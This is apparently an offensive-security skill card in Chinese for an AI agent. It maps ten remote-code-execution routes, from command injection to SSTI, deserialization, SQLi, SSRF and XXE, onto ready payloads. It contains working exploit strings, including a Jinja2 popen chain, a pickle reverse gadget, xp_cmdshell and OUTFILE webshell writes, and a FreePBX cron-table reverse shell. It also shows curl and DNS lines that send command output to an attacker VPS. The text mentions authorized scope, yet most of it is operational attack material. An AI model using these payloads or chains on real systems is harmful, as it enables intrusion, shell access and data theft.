---
name: rce-encyclopedia
description: >-
  RCE 十形矩阵：攻击面×漏洞形态×利用链。触发：rce、抢rce、getshell、远程代码执行、
  命令执行、拿 shell、RCE 百科、RCE 家族。
  认形后立刻进专卡 + rce_forge，禁止只背矩阵结案。
  写文件成功 ≠ RCE；DNSlog ≠ GetShell。
---

# RCE 十形矩阵（测绘引擎）

目标须在 `config/scope*.json`。本卡是 **分流**，打穿走专卡和 `rce_forge.py`。  
`shoot` 出 `uid=` 才算 L3。授权内写马/反弹直接做。

| 档 | 成立 | 不算 |
|----|------|------|
| primitive | 延时 / DNS / 报错可控 | 只猜组件名 |
| L2 / local_proof | 靶场或回显标记 `se9359` / 算术 49 | 只 nuclei 版本 |
| L3 / remote_proof | `uid=` 或文件 **可执行** 或回连 | 上传 200；管理后台登录 |

## 立刻跑

```bash
python3 tools/ops/rce_family_route.py --signal 命令注入
python3 tools/ops/rce_family_route.py --list
python3 tools/ops/rce_family_route.py grade --kind primitive --note 'dnslog only'
python3 tools/ops/rce_forge.py --list
python3 tools/ops/rce_forge.py shoot --family cmdi-unix --url 'https://授权/?q=1' --param q --case <案>
```

## 十形 → 专卡

| 形 | 走 | 锻造族 |
|----|----|--------|
| 命令注入 | `command-injection-testing` · `tpl_inject_probe.py cmdi` | `cmdi-unix` |
| SSTI | `ssti-exploit` · `tpl_inject_probe.py ssti` | `ssti-jinja` / twig / … |
| 反序列化 | `deserialization-testing` / PHP 反序列化手法 | `deser-pickle` |
| 上传 | `file-upload-testing` · `upload_forge_probe.py` | 落马后再 `php-eval` |
| LFI | `lfi-rfi-exploit` · `tpl_inject_probe.py lfi` | `php-wrap` |
| SQLi→RCE | `sql-injection-testing` · `sqlmap_kit.py ladder` | OUTFILE / xp_cmdshell |
| SSRF→RCE | `ssrf-testing` · `ssrf_probe.py` | gopher Redis / IMDS |
| XXE | `xxe-injection-testing` | `xxe-expect` |
| JNDI | `log4shell-exploitation` | `jndi` |
| 表达式 | `expression-language-injection` | `el-spel` / ognl |

无回显：时间盲注 → DNS 外带 → HTTP 外带。先 `se_listen.py` 再射回连。

```bash
python3 tools/ops/oob_exfil.py dns --data id --domain oob.lab
python3 tools/ops/oob_exfil.py http --data id --url http://攻击机:8080/
```

## 强制

1. 点名抢 RCE / getshell **先本卡认形**，再专卡，不要空喊百科。
2. 写文件 / DNSlog / 登录后台 **不许写成已 GetShell**。
3. 先默认口令和基础设施口，再高端 CVE。
4. 一次只改一个变量。清日志仍先问。

## 真源

- 手法：`docs/playbooks/测绘引擎RCE锻造手法.md`
- 路由：`tools/ops/rce_family_route.py`
- 锻造：`tools/ops/rce_forge.py`

---

<!-- 以下内容合并自兄弟技能库 (2026-09-12) -->

---
name: rce-encyclopedia
description: "RCE全打法家族矩阵: 攻击面×漏洞形态×利用链。触发: rce, 抢rce, getshell, 命令执行。"
---

# RCE 百科全书 — 全打法家族矩阵

全球 RCE 教程整合(2026-08 收集, 47万字节原始材料)。核心理念(用户偏好): **类级拓展 — 攻击面 × 漏洞形态 × 利用链可横向替换**, 拒绝单点打法。

## 何时使用

- 目标是任意 Web 服务/中间件, 需要 RCE/命令执行/getshell
- 用户说: rce、抢rce、远程代码执行、getshell、拿shell、命令执行
- 拿到指纹后要快速确定该用哪条 RCE 路线
- 与 server-getshell-playbook(十大路径/实战纪律)配合: 本 skill 提供**漏洞形态级**完整矩阵, getshell-playbook 提供**流程纪律**

## 核心矩阵: 攻击面 × 漏洞形态 → RCE 路线

```
输入面                漏洞形态                  RCE 路线
─────────            ──────────               ─────────────
用户输入(参数/头)   → 命令注入(OS CMD)      → 直接 system()/shell
模板渲染            → SSTI                   → Jinja2/Twig/ERB → RCE
XML/JSON/YAML       → XXE/反序列化           → 读文件/SSRF → RCE
文件上传            → 任意文件上传           → webshell/覆盖配置 → RCE
文件包含            → LFI/RFI               → php://filter/log/会话 → RCE
数据库查询          → SQLi                  → OUTFILE/udf/xp_cmdshell → RCE
HTTP 请求转发       → SSRF                  → 内网服务(Redis/MySQL) → RCE
对象反序列化        → 不安全反序列化         → gadget 链(pickle/phpggc/ysoserial)
模板/DSL 编译       → 表达式注入             → 沙箱逃逸 → RCE
认证/会话           → 弱口令/越权           → 管理面上传/执行 → RCE
```

## 十大漏洞形态速查(每条: 探测 → 确认 → 利用)

### 1. 命令注入 (Command Injection)
```
探测: 参数后加 ;id / |id / `id` / $(id) / %0aid
     POST body / header(X-Forwarded-For) / filename 都可能注入
绕过: 空格→${IFS}/%09  |  黑名单→$()/``/$(printf)  |  编码→base64
利用链: 回显直接看 → 无回显用 sleep/time 盲注 → DNS/HTTP 外带
关键: echo <b64>|base64 -d|bash  一条龙落地
```

### 2. SSTI (Server-Side Template Injection)
```
引擎识别: {{7*7}} → 49  |  ${7*7}  |  <%=7*7%>  |  #{7*7}
Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
           {{''.__class__.__mro__[1].__subclasses__()}} 找 subprocess
Twig:      {{['id']|filter('system')}} / {{_self.env.registerUndefinedFilterCallback}}
沙箱逃逸: 绕过 _ 过滤用 attr/request[arg] | 过滤 . 用 ['x']['y']
参考: hacktricks/ht_ssti-server-side-template-injection_README.md
```
### 2b. 恶意主题/模板文件注入(模板引擎代码执行)— Ghost CMS CVE-2026-29053(0.7.2–6.19.0)
- 形态: CMS 允许上传/激活主题(zip),模板文件(handlebars `.hbs` 等)内嵌代码在渲染时执行 → RCE
- Ghost 实链(MSF module 2026-09,含 CVE-2026-22594 Staff 2FA bypass 6.0.0–6.10.3 / 5.105.0–5.130.5):
  1. 弄到 staff 会话: 账号密码登录;版本命中则走 2FA bypass
  2. 上传"感染"主题 zip: 在 `tag-{{SLUG}}.hbs`/`page-{{SLUG}}.hbs` 模板插 `{{!< default}}` + JS payload: `process.mainModule.require('child_process').exec("<b64 bytes>",{detached:1})`
  3. `PUT /themes/<name>/activate/` 激活 → GET 对应 tag/page 触发渲染 → 命令执行(可反向 shell)
- 类级迁移: 任何"上传主题/插件/模板包 + 服务端渲染"的 CMS(WordPress 插件、博客、wiki)同链;模板不限于 handlebars(Node 系 EJS/Pug 同理)
- 参考: https://www.endorlabs.com/learn/rce-in-ghost-cms-ghsa-cgc2-rcrh-qr5x

### 3. 不安全反序列化 (Deserialization)
```
识别头部: Java rO0 / PHP O: / Python gASV(80 04 95) / .NET AAEAAAD
Java: ysoserial 生成 gadget(CommonsCollections/URLDNS 探测)
PHP:  phpggc 生成 phar → phar:// 触发(ShowDoc 实战链: SQLi→token→PHAR→RCE)
Python: pickle.loads 直接 RCE | PyYAML yaml.load | jsonpickle
        ┌─────────────────────────────────────────────┐
        │ import os,base64;                              │
        │ class P:                                       │
        │   def __reduce__(self):                        │
        │     return(os.system,(base64.b64decode('...'),))│
        │ pickle.dumps(P())   ← 生成的 payload 给目标     │
        └─────────────────────────────────────────────┘
参考: patt_Insecure_Deserialization.md + sub/patt_python_deser.md
```

### 4. 文件上传 → Webshell (Upload)
```
绕过层次: 后缀(php5/phtml/phar/pht) → Content-Type → 双扩展名
         → 图片马+包含 → 大小写 → 空字节 → PolyShell(多 MIME)
落点探测: /uploads/ /files/ /static/ 可执行性
蚁剑/冰蝎/哥斯拉连接; 或直接 URL 访问执行
参考: patt_Upload_Insecure_Files.md + hacktricks/ht_file-upload_README.md
```

### 5. LFI → RCE (File Inclusion)
```
PHP filter: php://filter/convert.base64-encode/resource=index.php
日志包含:  User-Agent 写 shell → include /var/log/nginx/access.log
会话包含:  php_session_upload_progress → 会话文件写 shell
phar 反序列化: phar://xxx.phar 触发反序列化(与 #3 联动)
环境: /proc/self/environ /proc/self/fd/ 都可能是注入点
参考: hacktricks/ht_lfi2rce-via-php-filters.md(33KB 全套路)
      + ht_lfi2rce-via-phpinfo.md + ht_lfi2rce-via-nginx-temp-files.md
```

### 6. SQLi → RCE
```
MySQL: SELECT ... INTO OUTFILE '/var/www/html/s.php' (FILE 权限)
       读文件: LOAD_FILE('/etc/passwd')
MSSQL: xp_cmdshell 'whoami' → 开启后直接命令执行
PostgreSQL: COPY (SELECT 'x') TO PROGRAM 'id' / lo_import+lo_export
SQLi 自动化: sqlmap --os-shell (一条龙)
参考: patt_SQL_Injection.md(33KB)
```
### 6b. 堆叠 SQLi → 写计划任务表 → RCE(FreePBX CVE-2025-57819,CVSS 9.8,CISA KEV)
- 适用: 应用支持**堆叠查询**(;多语句)且 DB 用户可 INSERT 业务表;Web 框架有 cron/计划任务表则命令每分钟被执行
- FreePBX 实链(2026-09 PoC exploit-db 52681,影响 15<15.0.66/16<16.0.89/17<17.0.3):
  1. 验证: `GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x' AND EXTRACTVALUE(1,CONCAT('~',(SELECT USER()),'~')) -- -` → XPATH 报错 + 用户名 = SQLi 确认
  2. 注入: `brand=x' ;INSERT INTO cron_jobs (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order) VALUES ('sysadmin','revshell',0x<hex("echo <b64>|base64 -d|bash")>,NULL,'* * * * *',30,1,1) -- `
  3. 等 cron 每分钟执行 → reverse shell(Apache 用户)
- 类级迁移: 目标有 `cron_jobs`/`tasks`/`schedules` 表 + 堆叠 SQLi → 同链;宝塔/面板类应用计划任务同样适用

### 6c. 数据库查询 → Java 反序列化 RCE(Metabase CVE-2026-59827, 认证后)
- 形态: BI/数据平台允许**原生 SQL 查询** + 后端连了 H2(或任意可返回 OTHER 类型对象的 JDBC 库)→ **结果列反序列化无校验** → 命令执行
- Metabase 实链(PoC exploit-db 52680 / CVE-2026-59827):
  1. 登录(有 native query 权限的账号)+ `GET /api/database` 找 `engine=="h2"` 的库(**默认 sample 库就是 H2**)
  2. 本地 Java 生成恶意序列化 payload(`clojure-1.12.3.jar` + `VarChainPayload.class`)
  3. `POST /api/dataset` body `{"database":<id>,"native":{"query":"SELECT CAST(X'<hex>' AS OTHER)"},"type":"native"}` → 触发反序列化 → OS 命令执行
  4. 回显靠异常(H2 执行后报错 ClassCastException/ProcessImpl 等 = 命令已跑)
- 影响版本: >=0.58.0 <0.58.15 / >=0.59.0 <0.59.12 / >=0.60.0 <0.60.6.3 / >=0.61.0 <0.61.1.4
- PoC: https://github.com/Gutierre0x80/CVE-2026-59827
- 类级迁移: 任何"暴露原生查询/表达式"的数据平台(Metabase/Superset/自研报表),重点看**结果集类型转换**与后端 JDBC 库能否返回对象;**认证后 RCE 的价值在"低权账号即可"** → 配合默认凭据/弱口令直接成链
- 来源: https://www.exploit-db.com/exploits/52680

### 7. SSRF → RCE
```
内网服务打: gopher://redis(写 crontab/ssh key) / gopher://mysql
            http://169.254.169.254 (云 metadata → 凭证 → RCE)
回显判断: 响应内容差异 / 时间差 / DNS 外带(burp collaborator)
盲 SSRF: 用 dnslog 确认 → 打内网服务
参考: hacktricks/ht_ssrf-server-side-request-forgery_README.md(35KB)
```

### 8. XXE → RCE/文件读
```
<!DOCTYPE x [<!ENTITY f SYSTEM "file:///etc/passwd">]> <x>&f;</x>
盲 XXE: 外带 DTD → 读文件 / SSRF
PHP:  expect:// 伪协议(需扩展) | 配合 #5 拿 shell
参考: patt_XXE_Injection.md(29KB)
```

### 9. 已知 CVE 批量打 (2026 在野)
```
nuclei 模板: 2024:607 + 2025:403 + 2026:250 个 CVE 模板
2026 热点: CVE-2026-14894 (WordPress Super Forms 任意文件上传 9.8)
          CVE-2026-20079 (Cisco FMC 认证绕过 10.0)
          CVE-2026-21643 (Fortinet FortiClientEMS SQLi→PG RCE 9.8)
          CVE-2026-10823 (YMC Filter WP 未授权泄露 7.5)
          CVE-2026-33017 (Langflow 未授权 RCE 9.3, CISA KEV — 详 llm-ai-security-pentest §5)
          CVE-2026-39987 (Marimo 未授权 /terminal/ws RCE 9.3 — 详 llm-ai-security-pentest §5)
          CVE-2026-81578 / CVE-2026-82078 (PaperCut NG/MF RCE, 已入野 — 详 printer-security)
          CVE-2026-75754 (ASUS Control Center Enterprise ≤4.0.0.2, CVSS 10.0 未授权 root)
          CVE-2026-85146/85147/85148/85149 (Lightstar SmartIT Desktop Manager 硬编码凭据族)
流程: 指纹识别 → 查 CVE 库 → nuclei -t 定向打
参考: patt_CVE_Exploits.md
```
### 9b. 管理/终端管理软件 硬编码凭据 → 开 SSH → root(2026 高发, 类级)
- 形态: 企业"资产/终端/远程运维管理套件"把 **SSH/SFTP 账号、加密密钥**写死在源码或未授权接口里 → 未授权即取 → 直接进底层主机。多为 **CVSS 9.8~10.0、零交互**。
- ASUS Control Center Enterprise ≤4.0.0.2 (**CVE-2026-75754, CVSS 10.0**): 未授权 HTTP 取加密密钥(CWE-306)→ 借 **SSRF** 触发本地服务 **在 2222 端口开 SSH** → 硬编码凭据登录 → **root shell** → 可远控该公司全部服务器/PC/工作站
- Lightstar SmartIT Desktop Manager ≤10(**CVE-2026-85146 等四 CVE**): Agent 源码内嵌 SSH/SFTP 固定账号/固定口令 → 未授权读取 → 该 Agent **所在每台主机同一凭据**,一击即面向全网终端
- 打法(类级): 测绘此类管理面(ASUS ACC / SmartIT / Kaseya / 各类"终端管理·资产盘点·远程运维")→ ①找**未授权返回密钥/凭据的接口** ②看能否借此**开内部服务**(SSH/SMB/自更新,经 SSRF)③固定账号登录。**不要停在"只读泄露",链到管理员/root 才算拿下**
- 来源: CVE.org / TWCERT-CC 2026-09-04;NVD

### 10. 提权后的 RCE 落地 (GTFOBins/LOLBAS)
```
拿到 shell 后要更高权限执行 → GTFOBins(478 个 Linux 二进制逃逸)
  sudo -l 列出的每个程序去 GTFOBins 查逃逸
  find / -perm -4000 2>/dev/null → SUID 逃逸
Windows 等效: LOLBAS(lolbas-project.github.io)
参考: 在线 https://gtfobins.github.io / https://lolbas-project.github.io
```

## 无回显 RCE 三板斧

1. **时间盲注**: `cmd && sleep 5` → 响应延迟 5s = 执行成功
2. **DNS 外带**: `cmd | nslookup x.dnslog.cn` → dnslog 平台收解析
3. **HTTP 外带**: `curl http://你的VPS:PORT/$(whoami | base64)` → VPS 日志收数据

## 判断标准(不许把中间信号当成功)

- 回显命令执行结果(uid=xxx / 文件内容)= 实锤
- 延时/DNS 命中 = 盲打成功, 需升级到回显 shell
- **写文件成功 ≠ RCE**: 必须验证文件可执行/可访问(用户曾纠正)
- 管理后台登录 ≠ 能 shell; 数据导出 ≠ 打进去(用户明确标准)

## 证据分级(03 教程核心, 报告不许跳级)

```
hypothesis  只是猜测              标题像 Jenkins
observed    有观察证据            页面 footer 显示版本
primitive   证明一个基础原语      可控 DNS 请求/可控报错/可控时间差
local_proof 本地靶场复现成功      同版本 Docker 可复现
remote_proof 授权目标低风险验证   授权窗口内得到可控可回滚证据
```

**不跳级铁律**:
- 发现 DNSlog 回连 ≠ 已 GetShell(只证明出网原语)
- 发现可上传文件 ≠ 已 RCE(必须验证文件可执行/可访问)
- 发现 WebShell 文件 ≠ 已完全控制
- 工具能连 WebShell ≠ 报告完成(要写清入口/写入方式/权限/影响/清理)

**DNSlog 证据模板**(盲打必记录):
```
payload_id: PAYLOAD
callback_domain: TOKEN.dnslog.local
request_path: /PATH
observed_time: YYYY-MM-DD HH:MM
source_ip: TARGET
conclusion: only proves outbound DNS reached; does not prove full command execution
```

**复现纪律**: 一次只改一个变量; 保存 raw request/response; baseline→modified→observation→conclusion→cleanup。

## 实战纪律(用户纠正过)

1. 先指纹后打: CMS/框架版本 → 对应 CVE 优先
2. 先默认口令再谈漏洞: admin/admin 这类基础面优先级高于 0day
3. 一条链打通: 单个漏洞只算洞, 链到 RCE 才算价值
4. 诚实记录: 无回显/打不通就记录"不可利用", 不吹
5. 基础设施层(全端口/管理口/默认口令)优先于高端 CVE

## 参考文件(全部本地已收集, D:\渗透\rce_research\)

| 文件 | 来源 | 大小 |
|---|---|---|
| patt_Command_Injection.md | PayloadsAllTheThings | 16KB |
| patt_SQL_Injection.md | PayloadsAllTheThings | 33KB |
| patt_Upload_Insecure_Files.md | PayloadsAllTheThings | 20KB |
| patt_XXE_Injection.md | PayloadsAllTheThings | 29KB |
| patt_File_Inclusion.md | PayloadsAllTheThings | 6.7KB |
| patt_Server_Side_Template_Injection.md | PayloadsAllTheThings | 12KB |
| patt_Insecure_Deserialization.md | PayloadsAllTheThings | 5KB |
| sub/patt_python_deser.md | PayloadsAllTheThings | 5.4KB |
| sub/patt_php_deser.md | PayloadsAllTheThings | 15KB |
| sub/patt_java_deser.md | PayloadsAllTheThings | 25KB |
| patt_Server_Side_Include_Injection.md | PayloadsAllTheThings | 6.4KB |
| patt_NoSQL_Injection.md | PayloadsAllTheThings | 8.2KB |
| patt_Prototype_Pollution.md | PayloadsAllTheThings | 10KB |
| patt_Race_Condition.md | PayloadsAllTheThings | 8.4KB |
| patt_CRLF_Injection.md | PayloadsAllTheThings | 5.7KB |
| patt_API_Key_Leaks.md | PayloadsAllTheThings | 5.7KB |
| patt_CVE_Exploits.md | PayloadsAllTheThings | 6.1KB |
| patt_Web_Sockets.md | PayloadsAllTheThings | 8KB |
| patt_Insecure_Direct_Object_References.md | PayloadsAllTheThings | 7.4KB |
| meth_Reverse_Shell_Cheatsheet.md | PayloadsAllTheThings | 4.9KB |
| meth_Linux_-_Privilege_Escalation.md | PayloadsAllTheThings | 6.7KB |
| hacktricks/ht_command-injection.md | HackTricks | 13KB |
| hacktricks/ht_file-inclusion_README.md | HackTricks | 44KB |
| hacktricks/ht_file-upload_README.md | HackTricks | 47KB |
| hacktricks/ht_ssti-server-side-template-injection_README.md | HackTricks | 50KB |
| hacktricks/ht_deserialization_README.md | HackTricks | 73KB |
| hacktricks/ht_ssrf-server-side-request-forgery_README.md | HackTricks | 36KB |
| hacktricks/ht_lfi2rce-via-php-filters.md | HackTricks | 33KB |
| hacktricks/ht_lfi2rce-via-phpinfo.md | HackTricks | 15KB |
| hacktricks/ht_lfi2rce-via-nginx-temp-files.md | HackTricks | 6.8KB |
| hacktricks/ht_lfi2rce-via-temp-file-uploads.md | HackTricks | 2.6KB |
| hacktricks/ht_phar_deser.md | HackTricks | 2.2KB |

## 关联

- server-getshell-playbook: 十大 getshell 路径 + 2026 在野案例 + 实战纪律
- web-ssti / web-ssrf / web-xxe / web-deserialization: 单点深度
- vulnerability-research: 0day/代码审计方向
